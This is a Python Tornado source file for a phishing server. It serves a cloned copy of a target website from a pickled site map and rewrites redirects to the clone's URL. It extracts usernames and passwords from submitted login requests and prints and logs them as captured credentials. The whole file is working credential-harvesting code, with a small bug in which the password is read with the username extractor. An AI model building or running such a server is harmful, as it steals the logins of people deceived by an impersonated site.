import sys, os
import tornado.ioloop
import tornado.web
import tornado
import pickle
from siteclone import SiteMap
from siteclone.httphelper import Request, Response
from siteclone.httphelper.request import HTTPHeader

site_map_file = "/app/sitemap.sm"
credentials_out_dir = "/app/logs/"
site_map = None
log_file = ""
clone_url = ""
credentials = {}

class CloneHandler(tornado.web.RequestHandler):
    RedirectCodes: list[int] = [301, 302, 303]

    def get(self):
        self.process()

    def post(self):
        self.process()
        
    def clone_response(self, request: 'siteclone.httphelper.request.Request', entry) -> None:
        orig_response = entry.response
    
        # set status_code
        self.set_status(orig_response.status)
    
        # set headers
        content_type = entry.get_response_header(HTTPHeader.ContentType, request)
        if content_type is not None:
            self.set_header(HTTPHeader.ContentType, content_type)
        
        location = entry.get_response_header(HTTPHeader.Location, request)
        if orig_response.status in CloneHandler.RedirectCodes and location is not None:
            global clone_url, site_map
            self.set_header(HTTPHeader.Location, location.replace(f"http://{site_map.domain}", clone_url).replace(f"https://{site_map.domain}", clone_url))
        
        self.write(entry.get_response_content(request))

    def process(self):
        global site_map
        
        request = Request.from_tornado_request(self.request)
        entry = site_map.get_entry(request)
        if entry is None:
            self.write("{}")
            return
            
        if not entry.is_terminal:
            self.write("{}")
            return
            
        if entry.is_output:
            if "username" in entry.extractors_info and "password" in entry.extractors_info:
                username_extractor_type, username_extractor_rule, _ = entry.extractors_info["username"][0]
                username_extractor = username_extractor_type(request)
                username_value = username_extractor.extract(username_extractor_rule)
                
                password_extractor_type, password_extractor_rule, _ = entry.extractors_info["password"][0]
                password_extractor = password_extractor_type(request)
                password_value = username_extractor.extract(password_extractor_rule)
                
                global credentials
                if (username_value, password_value) not in credentials:
                    print(f"[+] Credentials: ({username_value}, {password_value})")
                    with open(os.path.join(credentials_out_dir, log_file), "a") as fp:
                        fp.write(f"[+] Credentials: ({username_value}, {password_value})\n")
                    credentials[(username_value, password_value)] = True
        
        self.clone_response(request, entry)


def make_app():
    return tornado.web.Application([
        (r".*", CloneHandler),
    ])

if __name__ == "__main__":    
    
    if "LOG_FILE" not in os.environ:
        print("missing var LOG_FILE")
        sys.exit(1)
    if "CLONE_URL" not in os.environ:
        print("missing var CLONE_URL")
        sys.exit(1)
   
    log_file = os.environ["LOG_FILE"]
    clone_url = os.environ["CLONE_URL"]
    
    if not os.path.isfile(site_map_file):
        print("[!] Invalid site map file path.")
        sys.exit(1)

    if not os.path.isfile(os.path.join(credentials_out_dir, log_file)):
        open(os.path.join(credentials_out_dir, log_file), "w").close()

    with open(site_map_file, "rb") as file_in:
        site_map = pickle.load(file_in)
        
    app = make_app()
    app.listen(8888)
    tornado.ioloop.IOLoop.current().start()
